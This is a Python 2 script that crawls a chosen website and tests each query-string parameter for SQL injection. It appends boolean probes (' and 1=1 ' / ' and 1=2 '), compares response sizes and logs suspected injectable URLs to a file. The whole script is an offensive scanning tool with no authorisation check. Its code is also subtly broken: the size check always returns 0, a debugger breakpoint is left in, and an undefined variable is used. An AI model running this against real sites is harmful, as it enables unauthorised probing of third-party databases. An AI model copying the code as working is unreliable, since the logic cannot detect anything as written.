#!/usr/bin/env python
#encoding=utf-8

'''
function:it can traversal a website and find the injectable points.
author:jaffer
time:2014-05-15
构架：爬虫系统，url分析系统，sql注入判断系统，保存url系统
'''
import pdb
import re
import httplib2
import urllib2
import urllib
from sys import argv
from os import makedirs,unlink,sep
from os.path import dirname,exists,isdir,splitext
from string import replace,find,lower
from htmllib import HTMLParser
from urllib import urlretrieve
from urllib import urlopen
from urlparse import urlparse,urljoin
from formatter import DumbWriter,AbstractFormatter
from cStringIO import StringIO
import sys 

pdb.set_trace()

reload(sys) 
sys.setdefaultencoding('utf8')

#url分析系统
class url_parse(object):
	def __init__(self,url):
		self.url = url
		#判断是否是http://www.ssss.com/?dd=3的形式。同时增加判断，url大于512字节认为不可靠，过滤掉
	def isValidUrl(self):
		pattern = re.compile(r'http://[0-9a-zA-Z._/]*\?[a-zA-Z_]*=[0-9a-zA-Z_]*[0-9a-zA-Z._/=&]*')
		match = pattern.match(self.url)
		if match:
			return 1
		else:
			return 0
		#判断是否有无法解析的url，比如一些doc文档。
	def isGoodUrl(self):
		if len(self.url) >= 512:
			return 1
		pat=re.compile(r'[0-9a-zA-Z._/\?:=&@]*\.(jpg|swf|gif|cer|png|doc|xls|ppt|pptx|docs|rar|zip|pdf|chm|apk)')
		match = pat.match(self.url)
		if match:
			return 1
		else:
			return 0
	
	def getInfo(self):
		h = httplib2.Http()
		res,con = h.request(self.url,'GET')
		servertype = res['server']
		webtype = res['x-powered-by']
		print 'the type of server is :'+servertype
		print 'the type of web powered by '+webtype
		print '\nplease wait......'


#sql注入引擎
class sqlinjec(object):
	def __init__(self,url,file,test1,test2):
		self.url = url
		self.file = file
		self.test1 = test1
		self.test2 = test2
	def getFileSize(self,url):
		h = httplib2.Http()
		res,con = h.request(url,'GET')
		#有时候没有content-length这个键，这里要注意处理这个异常，我们全部以0的长度返回。
		try:
			fileSize = res['content-length']
			return int(fileSize)
		finally:
			return 0
	#对于http://www.xxx.com/?id=1&name=str&title=22进行测试，每一个都进行
	def sqlinjection(self):
		print self.url
		pos = self.url.find('&')
		while pos != -1:
			#构建新的newurl
			newurl_1 = self.url[:pos]+self.test1+self.url[pos:]
			newurl_2 = self.url[:pos]+self.test2+self.url[pos:]
			print newurl_1
			print newurl_2
			size_1 = self.getFileSize(newurl_1)
			size_2 = self.getFileSize(newurl_2)
			size_3 = self.getFileSize(self.url)
			if size_1 == size_3 and size_2 != size_1:
				print '\nthe posible injection points:\n'+url
				self.file.write(url+'\n')
				self.file.write(newurl_1+'\n\n')
			print 'pos:%d\n' % pos
			pos = self.url.find('&',pos+1,-1)
			print 'pos:%d\n' % pos
		#放在最后，是上面查找，最后一个变量是没有计算在内的，这个统一在这里。
		if pos == -1:
			size_1 = self.getFileSize(self.url+self.test1)
			size_2 = self.getFileSize(self.url+self.test2)
			size_3 = self.getFileSize(self.url)
			if size_1 == size_3 and size_2 != size_1:
				print '\nthe posible injection points:\n'+self.url
				self.file.write(self.url+'\n\n')

#爬虫系统
class Retriever(object):
	def __init__(self,url):
		self.url = url

	#parse HTML ,save links
	def parseAndGetLinks(self):
		self.parser = HTMLParser(AbstractFormatter(DumbWriter(StringIO())))
		self.parser.feed(urlopen(self.url).read())
		self.parser.close()
		return self.parser.anchorlist

#manage entire crawler
class Crawler(object):
	count = 0
	def __init__(self,url):
		self.q = [url]
		self.seen = []
		self.dom = urlparse(url)[1]

	def getPage(self,url):
		r = Retriever(url)
		Crawler.count += 1
		self.seen.append(url)

		links = r.parseAndGetLinks()
		for eachLink in links:
			if eachLink in links:
				if eachLink[:4] != 'http' and find(eachLink,'://') == -1:
					eachLink = urljoin(url,eachLink)
				if find(lower(eachLink),'mailto:') != -1:
					continue
			if eachLink not in self.seen:
				if find(eachLink,self.dom) == -1:
					pass
				else:
					if eachLink not in self.q:
						self.q.append(eachLink)
					else:
						pass
			else:
				pass
		

	def go(self):
		first = 0
		try:
			injection = open('injection','a')
		except IOError:
			print 'file open failed.'
			return
		while self.q:
			url = self.q.pop()
			print url
			#调用url分析系统--->调用sql注入引擎---->保存url
			goodurl = url_parse(url)
			if first == 0:
				goodurl.getInfo()
				first = 1
			#同时，对这个url进行判断。是否能够解析，是否是http://www.ssss/index.apk的类似形式
			if goodurl.isGoodUrl() == 1:
				continue
			self.getPage(url)
			#是否是http://www.ssss/?id=11的类似形式
			if goodurl.isValidUrl() == 1:
				#sql注入引擎
				sql = sqlinjec(url,injection,'%20and%201=1%20','%20and%201=2%20')
				sql.sqlinjection()

		injection.close()


def main():
	if len(argv) > 1:
		url = argv[1]
	else:
		try:
			url = raw_input('Enter starting URL:')
		except (KeyboardInterrupt,EOFError):
			url = ''
		if not url:
			return
		robot = Crawler(url)
		robot.go()


if __name__ == '__main__':
	main()
	print '\nover \n the possible injection points are in the file injection.please input enter to quit'
	raw_input()




